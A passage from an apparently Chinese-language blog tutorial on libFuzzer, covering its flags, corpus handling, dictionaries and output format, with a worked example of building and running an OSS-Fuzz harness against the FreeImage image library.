<code>uaf</code>, 缓冲区溢出，<code>stack-use-after-return</code>, <code>container-overflow</code>等内存访问错误，使用-fsanitize = address</p><p><code>MemorySanitizer（MSAN）</code>： 检测未初始化内存的访问，使用-fsanitize = memory。MSAN不能与其他消毒剂结合使用，应单独使用。</p><p><code>UndefinedBehaviorSanitizer（UBSAN）</code>： 检测一些其他的漏洞，整数溢出，类型混淆等，检测到C / C ++的各种功能的使用，这些功能已明确列出来导致未定义的行为。使用-fsanitize = undefined，也可以将ASAN和UBSAN合并到一个版本中。</p></blockquote></li><li><p><code>-fsanitize-coverage=trace-pc-guard</code>: 为 <code>libfuzzer</code> 提供代码覆盖率信息</p></li><li><p><code>libFuzzer.a</code>: 为libfuzzer项目中执行<code>build.sh</code> 编译好生成的 <code>libFuzzer.a</code></p></li><li><p><code>-o fuzzer</code>:一个 <strong>生成 测试用例， 交给目标程序测试，然后检测程序是否出现异常</strong> 的程序</p></li></ul><p>这一步骤整体过程就是通过clang的<code>-fsanitize=fuzzer</code>选项可以启用libFuzzer，这个选项在编译和链接过程中生效，实现了条件判断语句和分支执行的记录，并且辅以libFuzzer中的库函数，通过生成不同的测试样例然后能够获得代码的覆盖率情况，最终实现所谓的fuzz testing。</p><p>对这一过程感兴趣的可以阅读<a href="https://i-m.dev/posts/20190831-143715.html">libFuzzer编译链接</a>，博主对比了正常clang编译和使用libFuzzer编译从准备—预处理—编译—汇编—链接全过程的对比，展示了libFuzzer在具体编译过程中的作用。</p><p>这一步最终生成的就是这个fuzzer。</p><h3 id="开始测试"><a href="#开始测试" class="headerlink" title="开始测试"></a>开始测试</h3><p>被测程序在启用<code>libFuzzer</code>并编译链接后，即成为了一个可接受用户参数的命令行程序，直接执行程序便是启动测试。</p><p>一般格式：</p><pre><code class="bash">./your-fuzzer -flag1=val1 -flag2=val2 ... dir1 dir2 ...</code></pre><p>flags代表各个控制测试过程的选项参数，可以提供零到任意个，但必须是严格的<code>-flag=value</code>形式</p><ul><li>选项前导用单横线，即使选项是一个词而非单个字符</li><li>选项必须要提供对应的值，即使只是一个开关选项如<code>-help</code>，必须要写作<code>-help=1</code>，且选项与值中间只能用等号，不能用空格。</li></ul><p>dirs表示语料库目录，它们的内容都会被读取作为初始语料库，但测试过程中生成的新输入只会被保存到第一个目录下。</p><p>常用有以下部分参数，全文我将附在博客的最后附件1中.</p><p><em>对于开关选项（如<code>help</code>），效用一列表示当参数启用时（<code>-help=1</code>）的效果</em></p><table><thead><tr><th>选项</th><th>默认</th><th>效用</th></tr></thead><tbody><tr><td>verbosity</td><td>1</td><td>运行时输出详细日志</td></tr><tr><td>seed</td><td>0</td><td>随机种子。如果为0，则自动生成</td></tr><tr><td>runs</td><td>-1</td><td>单个测试运行的次数（-1表示无限）</td></tr><tr><td>max_len</td><td>0</td><td>测试输入的最大长度。若为0，libFuzzer会自行猜测</td></tr><tr><td>minimize_crash</td><td>0</td><td>如果为1，则最小化提供的崩溃输入。与-runs = N或-max_total_time = N一起使用以限制尝试次数。</td></tr><tr><td>reduce_inputs</td><td>1</td><td>尝试减小输入的大小，同时保留其全部功能集</td></tr><tr><td>fork</td><td>0</td><td>在子过程中发生fuzzing的实验模式</td></tr><tr><td>ignore_timeouts</td><td>1</td><td>在fork模式下忽略超时</td></tr><tr><td>ignore_crashes</td><td>0</td><td>在fork模式下忽略崩溃</td></tr><tr><td>ignore_ooms</td><td>1</td><td>在fork模式下忽略OOM</td></tr><tr><td>cross_over</td><td>1</td><td>交叉输入</td></tr><tr><td>rss_limit_mb</td><td>2048</td><td>内存使用限制，以Mb为单位。使用0则禁用限制。</td></tr><tr><td>mutate_depth</td><td>5</td><td>每个输入连续突变的数量</td></tr><tr><td>shuffle</td><td>1</td><td>启动时打乱初始语料库</td></tr><tr><td>prefer_small</td><td>1</td><td>打乱语料库时将小输入置于优先位置</td></tr><tr><td>timeout</td><td>1200</td><td>若为正，表示单元运行最大秒数。超时会被提前中止</td></tr><tr><td>error_exitcode</td><td>77</td><td>libFuzzer本身出错时的退出码</td></tr><tr><td>timeout_exitcode</td><td>77</td><td>libFuzzer超时退出码</td></tr><tr><td>max_total_time</td><td>0</td><td>若为正，表示整个模糊测试运行最大秒数</td></tr><tr><td>dict</td><td>0</td><td>提供输入关键字的字典</td></tr><tr><td>use_counters</td><td>1</td><td>使用<a href="http://clang.llvm.org/docs/SanitizerCoverage.html#coverage-counters">覆盖率计数器</a>生成命中代码块的频率的近似计数；默认为1。</td></tr><tr><td>help</td><td>0</td><td>打印帮助并退出</td></tr><tr><td>merge</td><td>0</td><td>不损失覆盖率前提下，将第2/3/4/…个语料库合并到第一个中去</td></tr><tr><td>merge_control_file</td><td>0</td><td>指定合并进程的控制文件，用于恢复合并状态</td></tr><tr><td>jobs</td><td>0</td><td>运行的作业数量。所有作业的输出会被重定向到fuzz-JOB.log。</td></tr><tr><td>workers</td><td>0</td><td>运行作业的并发进程数。若为0，实验CPU核心数一半</td></tr><tr><td>reload</td><td>1</td><td>每N秒载主语料库，以知悉其他进程发现的单元</td></tr><tr><td>only_ascii</td><td>0</td><td>仅生成ASCII（isprint + isspace）输入</td></tr><tr><td>artifact_prefix</td><td>0</td><td>提供将模糊处理工件（崩溃，超时或缓慢的输入）另存为<code>$（artifact_prefix）file</code>时要使用的前缀。默认为空。</td></tr><tr><td>exact_artifact_path</td><td>0</td><td>如果为空则忽略（默认）。如果为非空，则将失败（崩溃，超时）时的单个工件写为<code>$（exact_artifact_path）</code>。这将覆盖 <code>-artifact_prefix，</code>并且不会在文件名中使用校验和。请勿将相同的路径用于多个并行进程。</td></tr><tr><td>detect_leaks</td><td>1</td><td>如果为1（默认值）并且启用了LeakSanitizer，则尝试在模糊测试期间检测内存泄漏（即，不仅在关闭时）。</td></tr><tr><td>print_final_stats</td><td>0</td><td>退出时打印统计信息</td></tr><tr><td>print_corpus_stats</td><td>0</td><td>退出时打印语料库元素统计信息</td></tr><tr><td>print_coverage</td><td>0</td><td>退出时打印覆盖率信息</td></tr><tr><td>close_fd_mask</td><td>0</td><td>为1则在关闭stdout，为2则关闭stderr，为3则关闭二者</td></tr></tbody></table><p>重运行模式：</p><pre><code class="bash">./your-fuzzer -flag1=val1 -flag2=val2 ... file1 file2 ...</code></pre><p>与上面一样，但是选项后面接的是文件列表而非文件夹列表，这些输入样例将会重新读取并输入运行，不会产生新样例，在回归测试时十分有用。</p><p>这里有几个选项功能是值得单独说一下的</p><h4 id="Seed-corpus-种子语料库"><a href="#Seed-corpus-种子语料库" class="headerlink" title="Seed corpus 种子语料库"></a>Seed corpus 种子语料库</h4><p>corpus语料库就是给目标程序的各种各样的输入</p><pre><code class="bash">mkdir MY_CORPUS./your-fuzzer MY_CORPUS/ seeds/</code></pre><p>当基于libFuzzer的模糊器以另一个目录作为参数执行时，它将首先递归地从每个目录中读取文件（在本例中MY_CORPUS/和seeds/都读），并对所有目录执行目标函数。然后，任何触发感兴趣的代码路径的输入将被写回到第一个语料库目录（在本例中为<code>MY_CORPUS</code>）。一般情况下我们将相关文件放在seeds的位置下，MY_CORPUS/目录为空，这样运行后生成的样本就存在MY_CORPUS/中了。</p><h4 id="精简语料库样本集"><a href="#精简语料库样本集" class="headerlink" title="精简语料库样本集"></a>精简语料库样本集</h4><p>在模糊测试期间，测试语料库可能会增长到很大容量。如果希望最小化语料库，即创建具有相同覆盖率的语料库子集但容量却小很多，这就是一件性价比十分高的事情了。</p><pre><code class="bash">mkdir corpus1_min./your-fuzzer -merge=1 corpus1_min corpus1</code></pre><ul><li><code>corpus1_min</code>: 精简后的样本集存放的位置</li><li><code>corpus1</code>: 原始样本集存放的位置</li></ul><h4 id="并行运行"><a href="#并行运行" class="headerlink" title="并行运行"></a>并行运行</h4><p>提高模糊测试效率的另一种方法是使用更多的CPU。如果您使用<code>-jobs=N</code>它运行模糊器，它将产生N个独立的作业，但最多不超过拥有的内核数的一半。用于<code>-workers=M</code>设置允许的并行作业数。</p><p>当指定了多个任务时，程序启动时会先产生一个<code>master</code>进程，同时并发启动相应数量个<code>worker</code>进程，master会把jobs分配到workers上去执行，当某个任务结束后，相应进程终止，同时master会启动一个新的任务进程分配到对应的worker上，平均每个worker上会分配<em>jobs/workers</em>个任务。</p><pre><code class="bash">./your-fuzzer MY_CORPUS/ seeds/ -jobs=8</code></pre><p>在8核计算机上，这将产生4个并行工作器。如果其中一个被退出，将自动创建另一个，最多8个。</p><pre><code class="bash">fuzzer -jobs=8  ├─sh -c ./fuzzer &gt;fuzz-0.log 2&gt;&amp;1  │   └─fuzzer  │       └─&#123;fuzzer&#125;  ├─sh -c ./fuzzer &gt;fuzz-1.log 2&gt;&amp;1  │   └─fuzzer  │       └─&#123;fuzzer&#125;  ├─sh -c ./fuzzer &gt;fuzz-2.log 2&gt;&amp;1  │   └─fuzzer  │       └─&#123;fuzzer&#125;  ├─sh -c ./fuzzer &gt;fuzz-3.log 2&gt;&amp;1  │   └─fuzzer  │       └─&#123;fuzzer&#125;</code></pre><h4 id="Dictionaries-字典"><a href="#Dictionaries-字典" class="headerlink" title="Dictionaries 字典"></a>Dictionaries 字典</h4><p>字典最早是afl在2015年一篇博客上提出的<a href="https://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html">afl-fuzz: making up grammar with a dictionary in hand</a>，</p><p>基本思路就是应用程序都是都是<strong>处理具有一定格式的数据</strong>，比如 <code>xml</code> 文档， <code>png</code>图片等等。 这些数据中会有一些<strong>特殊字符序列 （或者说关键字）</strong>， 比如 在 <code>xml</code> 文档中 就有 <code>CDATA</code>,  等，<strong>png图片</strong> 就有 <strong>png 图片头</strong>。</p><p>如果我们事先就把这些 <strong>字符序列</strong> 列举出来， <code>fuzz</code> 直接使用这些关键字去 组合，就会就可以减少很多没有意义的 尝试，同时还有可能会走到更深的程序分支中去。</p><p><code>Dictionary</code> 就是实现了这种思路。 <code>libfuzzer</code> 和 <code>afl</code> 使用的 <code>dictionary</code> 文件的语法是一样的， 所以可以直接拿 afl 里面的 <code>dictionary</code> 文件来给 <code>libfuzzer</code> 使用。</p><p>如下是libFuzzer官方文档中的字典示例</p><pre><code class="bash"># Lines starting with &#39;#&#39; and empty lines are ignored.# Adds &quot;blah&quot; (w/o quotes) to the dictionary.kw1=&quot;blah&quot;# Use \\ for backslash and \&quot; for quotes.kw2=&quot;\&quot;ac\\dc\&quot;&quot;# Use \xAB for hex valueskw3=&quot;\xF7\xF8&quot;# the name of the keyword followed by &#39;=&#39; may be omitted:&quot;foo\x0Abar&quot;</code></pre><ul><li><code>#</code> 开头的行 和 空行会被忽略</li><li><code>kw1=</code> 这些就类似于注释， 没有意义</li><li>真正有用的是由 <code>&quot;</code> 包裹的<strong>字串</strong>，这些 <strong>字串</strong> 就会作为一个个的关键字， <code>libfuzzer</code> 会用它们进行组合来生成样本。</li></ul><p><code>libfuzzer</code> 使用 <code>-dict</code> 指定 <code>dict</code> 文件，下面使用 <code>xml.dict</code> 为 <code>dictionary</code> 文件，进行 <code>fuzz</code>。</p><pre><code class="bash">./your-fuzzer -dict=DICTIONARY_FILE</code></pre><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>当fuzzer成功运行之后，信息会输出在屏幕上。输出行具有事件代码和统计信息的形式。常见的事件代码是：</p><ul><li><code>READ</code> fuzzer已从语料库目录中读取了所有提供的输入样本。</li><li><code>INITED</code> fuzzer已完成初始化，其中包括通过被测代码运行每个初始输入样本。</li><li><code>NEW</code> fuzzer创建了一个测试输入，该输入涵盖了被测代码的新区域。此输入将保存到主要语料库目录。</li><li><code>pulse</code> fuzzer已生成 2的n次方个输入（定期生成以使用户确信fuzzer仍在工作）。</li><li><code>DONE</code> fuzzer已完成操作，因为它已达到指定的迭代限制（<code>-runs</code>）或时间限制（<code>-max_total_time</code>）。</li><li><code>RELOAD</code> fuzzer在定期从语料库目录中重新加载输入；这使它能够发现其他fuzzer进程发现的任何输入（请参阅<a href="https://releases.llvm.org/4.0.0/docs/LibFuzzer.html#parallel-fuzzing">并行模糊化</a>）。</li></ul><p>每条输出行还报告以下统计信息（非零时）：</p><ul><li><code>cov：</code> 执行当前语料库所覆盖的代码块或边的总数。</li><li><code>ft：</code> libFuzzer使用不同的信号来评估代码覆盖率：边缘覆盖率，边缘计数器，值配置文件，间接调用方/被调用方对等。这些组合的信号称为<em>功能</em>（ft：）。</li><li><code>corp：</code> 当前内存中测试语料库中的条目数及其大小（以字节为单位）。</li><li><code>exec/s：</code> 每秒模糊器迭代的次数。</li><li><code>rss：</code> 当前的内存消耗。</li></ul><p>对于<code>NEW</code>事件，输出行还包含有关产生新输入的变异操作的信息：</p><ul><li><code>L：</code> 新输入的大小（以字节为单位）。</li><li><code>MS: &lt;n&gt; &lt;operations&gt;</code> 用于生成输入的变异操作的计数和列表。</li></ul><p>我们以如下样例作解释：</p><pre><code class="bash">INFO: Seed: 1608565063INFO: Loaded 1 modules (37 guards): [0x788ec0, 0x788f54), INFO: -max_len is not provided, using 64INFO: A corpus is not provided, starting from an empty corpus#0  READ units: 1#1  INITED cov: 3 ft: 3 corp: 1/1b exec/s: 0 rss: 11Mb#3  NEW    cov: 4 ft: 4 corp: 2/4b exec/s: 0 rss: 12Mb L: 3 MS: 2 InsertByte-InsertByte-#3348   NEW    cov: 5 ft: 5 corp: 3/65b exec/s: 0 rss: 12Mb L: 61 MS: 2 ChangeByte-InsertRepeatedBytes-#468765 NEW    cov: 6 ft: 6 corp: 4/78b exec/s: 0 rss: 49Mb L: 13 MS: 4 CrossOver-ChangeBit-EraseBytes-ChangeByte-#564131 NEW    cov: 7 ft: 7 corp: 5/97b exec/s: 0 rss: 56Mb L: 19 MS: 5 InsertRepeatedBytes-InsertByte-ChangeByte-InsertByte-InsertByte-===================================================================32049==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200072bb93 at pc 0x000000528540 bp 0x7ffdb3439100 sp 0x7ffdb34390f8READ of size 1 at 0x60200072bb93 thread T0    ......................................................    ......................................................    ......................................................0x60200072bb93 is located 0 bytes to the right of 3-byte region [0x60200072bb90,0x60200072bb93)allocated by thread T0 here:   ......................................................   ......................................................   ......................................................SUMMARY: AddressSanitizer: heap-buffer-overflow /home/haclh/vmdk_kernel/libfuzzer-workshop-master/lessons/04/./vulnerable_functions.h:22:14 in VulnerableFunction1(unsigned char const*, unsigned long)Shadow bytes around the buggy address:  0x0c04800dd720: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fa  0x0c04800dd730: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd  0x0c04800dd740: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa  0x0c04800dd750: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa  0x0c04800dd760: fa fa fd fa fa fa fd fa fa fa fd fd fa fa fd fd=&gt;0x0c04800dd770: fa fa[03]fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c04800dd780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c04800dd790: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c04800dd7a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c04800dd7b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0c04800dd7c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa............................................................................................................==32049==ABORTINGMS: 1 CrossOver-; base unit: 38a223b0988bd9576fb17f5947af80b80203f0ef0x46,0x55,0x5a,FUZartifact_prefix=&#39;./&#39;; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60Base64: RlVa</code></pre><p>首先我们可以看出来<code>Seed: 1608565063</code> 说明这次的种子数据，如果我们想重现重新运行<code>-seed=1608565063</code>以得到相同的结果。其次<code>-max_len is not provided, using 64</code> ， <code>-max_len</code> 用于设置最大的数据长度，因为没有设置fuzzer会自己猜测，这里设置的数据不大于64KB。</p><p>接下来 <code>#</code> 开头的行是 <code>fuzz</code> 过程中找到的路径信息</p><pre><code class="bash"># 564131 NEW    cov: 7 ft: 7 corp: 5/97b exec/s: 0 rss: 56Mb L: 19 MS: 5 InsertRepeatedBytes-InsertByte-ChangeByte-InsertByte-InsertByte-</code></pre><p>我们可以看出来libFuzzer尝试了至少564131个输入（<code>#564131</code>），发现了5个输入，总共97个字节（<code>corp: 5/97b</code>），它们总共覆盖了7个<em>覆盖点</em>（<code>cov: 7</code>）。我们可以将覆盖点视为代码中的 <a href="https://en.wikipedia.org/wiki/Basic_block">基本块</a>。</p><pre><code class="bash">==32049==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200072bb93 at pc 0x000000528540 bp 0x7ffdb3439100 sp 0x7ffdb34390f8READ of size 1 at 0x60200072bb93 thread T0</code></pre><p>这个信息说明在其中一个输入上，AddressSanitizer已检测到<code>heap-buffer-overflow</code>错误并中止了执行。</p><pre><code class="bash">artifact_prefix=&#39;./&#39;; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60</code></pre><p>倒数第二行是触发漏洞的测试用例，在退出进程之前，libFuzzer已创建了一个文件，其中包含触发崩溃的字节和所有信息，要重现崩溃而无模糊运行可以使用</p><pre><code class="bash">ASAN_OPTIONS=symbolize=1 ./first_fuzzer ./crash-0eb8e4ed029b774d80f2b66408203801# ASAN_OPTIONS=symbolize=1 用于显示栈的符号信息</code></pre><p>来重现crash</p><p>如果我们在fuzzer运行的选项里有使用字典 <code>-dictionary</code>和<code>-print_final_stats</code>执行完打印统计信息，最后的输出可能还会多出两块，形如下面</p><pre><code class="bash">###### Recommended dictionary. ######&quot;X\x00\x00\x00\x00\x00\x00\x00&quot; # Uses: 1228&quot;prin&quot; # Uses: 1353.................................................................................&quot;U&lt;/UTrri\x09&lt;/UTD&quot; # Uses: 61###### End of recommended dictionary. ######Done 1464491 runs in 301 second(s)stat::number_of_executed_units: 1464491stat::average_exec_per_sec:     4865stat::new_units_added:          1407stat::slowest_unit_time_sec:    0stat::peak_rss_mb:              407</code></pre><p>开始由 <code>####</code> 夹着的是 <code>libfuzzer</code> 在 <code>fuzz</code> 过程中挑选出来的 <code>dictionary</code>， 同时还给出了使用的次数，这些 <code>dictionary</code> 可以在以后 <code>fuzz</code> 同类型程序时 节省 <code>fuzz</code> 的时间。</p><p>然后以 <code>stat:</code> 开头的是一些 fuzz 的统计信息， 主要看 <code>stat::new_units_added</code> 表示整个 <code>fuzz</code> 过程中触发了多少个代码单元。</p><p>可以看到直接 <code>fuzz</code> , <code>5</code>分钟 触发了 <code>1407</code> 个代码单元</p><h2 id="实例篇"><a href="#实例篇" class="headerlink" title="实例篇"></a>实例篇</h2><h3 id="以Freeimage为例进行测试"><a href="#以Freeimage为例进行测试" class="headerlink" title="以Freeimage为例进行测试"></a>以Freeimage为例进行测试</h3><p>我们首先把最新版本的Freeimage给拉到本地，然后解压</p><pre><code class="bash">wget https://downloads.sourceforge.net/freeimage/FreeImage3180.zipunzip FreeImage3180.zip</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfjsagnbtqj316n09bn5y.jpg" alt="截屏2020-06-07 下午3.30.33"></p><p>对这个源包先进行一下编译</p><pre><code class="bash">pushd FreeImage# b44ExpLogTable.cpp only contains a definition of main().sed -i &#39;s/Source\/OpenEXR\/IlmImf\/b44ExpLogTable.cpp//&#39; Makefile.srcsmake LIBRARIES=-lc++ -j$(nproc)popd</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfjsf6ax3uj30yh0eshbw.jpg" alt="截屏2020-06-07 下午4.06.37"></p><p>编译成功后在Freeimage/Dist里应该就生成了<code>libfreeimage.a</code> ,<code>.h</code>和 <code> .o</code>文件</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfjsk1djg6j30f406l0tf.jpg" alt="截屏2020-06-07 下午4.11.18"></p><p>随后根据Freeimage的功能特性写对应的hardness，也就是fuzzing target，这里直接使用OSS-fuzz的project中给出的Freeimage的hardness，在根目录保存为load_from_memory_fuzzer.cc文件</p><pre><code class="c++">#include &lt;cstddef&gt;#include &lt;cstdint&gt;#include &lt;cstdlib&gt;#include &lt;vector&gt;#include &lt;FreeImage.h&gt;namespace &#123;// Returns true if the format should be attempted to loaded from memory.bool SafeToLoadFromMemory(FREE_IMAGE_FORMAT fif) &#123;  // For now, just load if it is a BMP. Future heuristics may need to be based  // on the expected size in different formats for memory regions to avoid OOMs.  return fif == FIF_BMP;&#125;&#125;  // namespaceextern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) &#123;  static bool initialized = false;  if (!initialized) &#123;    FreeImage_Initialise();  &#125;  if (size &gt; 100 * 1000) &#123;    return 0;  &#125;  std::vector&lt;uint8_t&gt; fuzzer_data_vector(data, data + size);  FIMEMORY* fiMem = FreeImage_OpenMemory(      reinterpret_cast&lt;unsigned char*&gt;(fuzzer_data_vector.data()),      fuzzer_data_vector.size());  FREE_IMAGE_FORMAT fif = FreeImage_GetFileTypeFromMemory(fiMem, 0);  if (SafeToLoadFromMemory(fif)) &#123;    FIBITMAP* fiBitmap = FreeImage_LoadFromMemory(fif, fiMem);    FreeImage_Unload(fiBitmap);  &#125;  FreeImage_CloseMemory(fiMem);  return 0;&#125;</code></pre><p>接下来的步骤就是开始编译fuzzer，把对应参数输入在后面，使用clang++开始编译</p><pre><code class="bash">clang++ -g -fsanitize=fuzzer,address \load_from_memory_fuzzer.cc ./FreeImage/Dist/libfreeimage.a \-o load_from_memory_fuzzer</code></pre><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfjstwsua4j30g402wdh5.jpg" alt="截屏2020-06-07 下午4.20.47"></p><p>出现了一点错误，看来是Freeimage.h文件没有找到，需要用-I 指定一下文件的路径让他可以找到</p><pre><code class="bash">clang++ -g -fsanitize=fuzzer,address -I&#39;/home/fstark/FreeImage/Dist&#39; \load_from_memory_fuzzer.cc ./FreeImage/Dist/libfreeimage.a \-o load_from_memory_fuzzer</code></pre><p>这次成功了，发现已经成功生成了load_from_memory_fuzzer</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfjswpiuydj30hw05zgnu.jpg" alt="截屏2020-06-07 下午4.23.28"></p><p>不加任何附加命令直接运行一下试试，发现可以跑了，就是速度不怎么快</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfjt13bmogj30hx0apdkv.jpg" alt="截屏2020-06-07 下午4.27.42"></p><p>当我做到这一步时，学长点拨前面的编译是有问题的，运行时结果仅覆盖57是肯定有问题的。通过在开会时看学长的讲解分析，确实在编译的时候直接拉freeimage的包，里面的makefile需要修改。这里把编译选项更改一下，其实我又回顾了一下之前clusterfuzz踩的坑，其中心脏滴血在编译的时候就要求加上<code>-fsanitize=address,fuzzer-no-link</code>，但之前没有细心注意。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfl6s8fzqjj30ha08eq3y.jpg" alt="image-20200608210908837"></p><p>我们在makefile.gnu里把默认的03改成01，再加上这几条推荐的编译选项，不得不说自己对于常见的编译过程真是陌生，要不是靠学长又是进坑几个小时，真要抽个时间好好补补这部分的内容了，做个编译过程大梳理和常见编译器对比什么的</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfl6u71z4kj30wu087jv6.jpg" alt="image-20200608211104945"></p><p>这样再编译一遍，不放样本，速度也好了很多</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfl8e9ir1ej30pj0fctht.jpg" alt="image-20200608220457407"></p><p>简单准备个样本集，再精简一下</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gflvdgizo9j30ra0alahs.jpg" alt="截屏2020-06-09 上午11.08.57"></p><p>简单跑一下，这次就可以跑出crash了，但是很多是重复的在跑的时候附加的选项还是要多多限制，逐渐摸索，但整体流程就是这样了</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gflvetkoakj31020i6dur.jpg" alt="截屏2020-06-09 上午11.18.29"></p><h2 id="附件一"><a href="#附件一" class="headerlink" title="附件一"></a>附件一</h2><table><thead><tr><th>Flags:</th><th>value</th><th>strictly in form -flag=value</th></tr></thead><tbody><tr><td>verbosity</td><td>1</td><td>Verbosity level.</td></tr><tr><td>seed</td><td>0</td><td>Random seed. If 0, seed is generated.</td></tr><tr><td>runs</td><td>-1</td><td>Number of individual test runs (-1 for infinite runs).</td></tr><tr><td>max_len</td><td>0</td><td>Maximum length of the test input. If 0, libFuzzer tries to guess a good value based on the corpus and reports it.</td></tr><tr><td>lea_control</td><td>100</td><td>Try generating small inputs first, then try larger inputs over time. Specifies the rate at which the length limit is increased (smaller == faster). If 0, immediately try inputs with size up to max_len. Default value is 0, if LLVMFuzzerCustomMutator is used.</td></tr><tr><td>seed_inputs</td><td>0</td><td>A comma-separated list of input files to use as an additional seed corpus. Alternatively, an “@” followed by the name of a file containing the comma-seperated list.</td></tr><tr><td>cross_over</td><td>1</td><td>If 1, cross over inputs.</td></tr><tr><td>mutate_depth</td><td>5</td><td>Apply this number of consecutive mutations to each input.</td></tr><tr><td>reduce_depth</td><td>0</td><td>Experimental/internal. Reduce depth if mutations lose unique features</td></tr><tr><td>shuffle</td><td>1</td><td>Shuffle inputs at startup</td></tr><tr><td>prefer_small</td><td>1</td><td>If 1, always prefer smaller inputs during the corpus shuffle.</td></tr><tr><td>timeout</td><td>1200</td><td>Timeout in seconds (if positive). If one unit runs more than this number of seconds the process will abort.</td></tr><tr><td>error_exitcode</td><td>77</td><td>When libFuzzer itself reports a bug this exit code will be used.</td></tr><tr><td>timeout_exitcode</td><td>70</td><td>When libFuzzer reports a timeout this exit code will be used.</td></tr><tr><td>max_total_time</td><td>0</td><td>If positive, indicates the maximal total time in seconds to run the fuzzer.</td></tr><tr><td>help</td><td>0</td><td>Print help.</td></tr><tr><td>fork</td><td>0</td><td>Experimental mode where fuzzing happens in a subprocess</td></tr><tr><td>ignore_timeouts</td><td>1</td><td>Ignore timeouts in fork mode</td></tr><tr><td>ignore_ooms</td><td>1</td><td>Ignore OOMs in fork mode</td></tr><tr><td>ignore_crashes</td><td>0</td><td>Ignore crashes in fork mode</td></tr><tr><td>merge</td><td>0</td><td>If 1, the 2-nd, 3-rd, etc corpora will be merged into the 1-st corpus. Only interesting units will be taken. This flag can be used to minimize a corpus.</td></tr><tr><td>stop_file</td><td>0</td><td>Stop fuzzing ASAP if this file exists</td></tr><tr><td>merge_control_file</td><td>0</td><td>Specify a control file used for the merge process. If a merge process gets killed it tries to leave this file in a state suitable for resuming the merge. By default a temporary file will be used.</td></tr><tr><td>minimize_crash</td><td>0</td><td>If 1, minimizes the provided crash input. Use with -runs=N or -max_total_time=N to limit the number attempts. Use with -exact_artifact_path to specify the output. Combine with ASAN_OPTIONS=dedup_token_length=3 (or similar) to ensure that the minimized input triggers the same crash.</td></tr><tr><td>cleanse_crash</td><td>0</td><td>If 1, tries to cleanse the provided crash input to make it contain fewer original bytes. Use with -exact_artifact_path to specify the output.</td></tr><tr><td>use_counters</td><td>1</td><td>Use coverage counters</td></tr><tr><td>use_memmem</td><td>1</td><td>Use hints from intercepting memmem, strstr, etc</td></tr><tr><td>use_value_profile</td><td>0</td><td>Experimental. Use value profile to guide fuzzing.</td></tr><tr><td>use_cmp</td><td>1</td><td>Use CMP traces to guide mutations</td></tr><tr><td>shrink</td><td>0</td><td>Experimental. Try to shrink corpus inputs.</td></tr><tr><td>reduce_inputs</td><td>1</td><td>Try to reduce the size of inputs while preserving their full feature sets</td></tr><tr><td>jobs</td><td>0</td><td>Number of jobs to run. If jobs &gt;= 1 we spawn this number of jobs in separate worker processes with stdout/stderr redirected to fuzz-JOB.log.</td></tr><tr><td>workers</td><td>0</td><td>Number of simultaneous worker processes to run the jobs. If zero, “min(jobs,NumberOfCpuCores()/2)” is used.</td></tr><tr><td>reload</td><td>1</td><td>Reload the main corpus every <N> seconds to get new units discovered by other processes. If 0, disabled</td></tr><tr><td>report_slow_units</td><td>10</td><td>Report slowest units if they run for more than this number of seconds.</td></tr><tr><td>only_ascii</td><td>0</td><td>If 1, generate only ASCII (isprint+isspace) inputs.</td></tr><tr><td>dict</td><td>0</td><td>Experimental. Use the dictionary file.</td></tr><tr><td>artifact_prefix</td><td>0</td><td>Write fuzzing artifacts (crash, timeout, or slow inputs) as $(artifact_prefix)file</td></tr><tr><td>exact_artifact_path</td><td>0</td><td>Write the single artifact on failure (crash, timeout) as $(exact_artifact_path). This overrides -artifact_prefix and will not use checksum in the file name. Do not use the same path for several parallel processes.</td></tr><tr><td>print_pcs</td><td>0</td><td>If 1, print out newly covered PCs.</td></tr><tr><td>print_funcs</td><td>2</td><td>If &gt;=1, print out at most this number of newly covered functions.</td></tr><tr><td>print_final_stats</td><td>0</td><td>If 1, print statistics at exit.</td></tr><tr><td>print_corpus_stats</td><td>0</td><td>If 1, print statistics on corpus elements at exit.</td></tr><tr><td>print_coverage</td><td>0</td><td>If 1, print coverage information as text at exit.</td></tr><tr><td>dump_coverage</td><td>0</td><td>Deprecated.</td></tr><tr><td>handle_segv</td><td>1</td><td>If 1, try to intercept SIGSEGV.</td></tr><tr><td>handle_bus</td><td>1</td><td>If 1, try to intercept SIGBUS.</td></tr><tr><td>handle_abrt</td><td>1</td><td>If 1, try to intercept SIGABRT.</td></tr><tr><td>handle_ill</td><td>1</td><td>If 1, try to intercept SIGILL.</td></tr><tr><td>handle_fpe</td><td>1</td><td>If 1, try to intercept SIGFPE.</td></tr><tr><td>handle_int</td><td>1</td><td>If 1, try to intercept SIGINT.</td></tr><tr><td>handle_term</td><td>1</td><td>If 1, try to intercept SIGTERM.</td></tr><tr><td>handle_xfsz</td><td>1</td><td>If 1, try to intercept 